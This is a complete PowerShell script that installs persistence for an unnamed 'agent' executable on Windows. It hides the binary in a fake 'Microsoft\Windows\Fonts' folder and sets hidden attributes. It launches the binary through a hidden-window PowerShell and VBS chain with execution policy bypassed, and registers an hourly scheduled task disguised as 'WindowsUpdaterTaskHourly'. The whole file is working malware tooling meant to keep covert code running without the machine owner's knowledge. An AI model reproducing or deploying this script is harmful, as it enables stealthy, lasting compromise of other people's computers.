$ProgressPreference = 'Continue'
$ErrorActionPreference = 'Stop'

$agentPath = $env:AgentPath
if (-not $agentPath -or -not (Test-Path $agentPath)) {
    Write-Output "ERROR: AgentPath not set or file missing: '$agentPath'"
    exit 1
}

# --- 1. Hidden folder ---
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Output "[+] Created hidden folder: $hideDir"
}

# --- 2. Copy agent directly (no ADS) ---
$agentFile = "$hideDir\agent.exe"
Copy-Item -Path $agentPath -Destination $agentFile -Force
attrib +h $agentFile
Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# --- 3. Launcher script (just runs the exe) ---
$launcherPath = "$hideDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$agentFile = '$agentFile'
Start-Process -WindowStyle Hidden -FilePath `$agentFile
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

# --- 4. VBS launcher ---
$vbsPath = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# --- 5. Scheduled task: every 1 hour ---
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Scheduled task created (runs every 1 hour)."
    schtasks /run /tn $taskName 2>$null
    Write-Output "✅ Agent launched immediately."
} else {
    Write-Output "❌ Task creation failed."
    exit 1
}

Write-Output "`n✅ PERSISTENCE COMPLETE"
Write-Output "Agent location: $agentFile (hidden)"
Write-Output "Task: $taskName runs every hour"
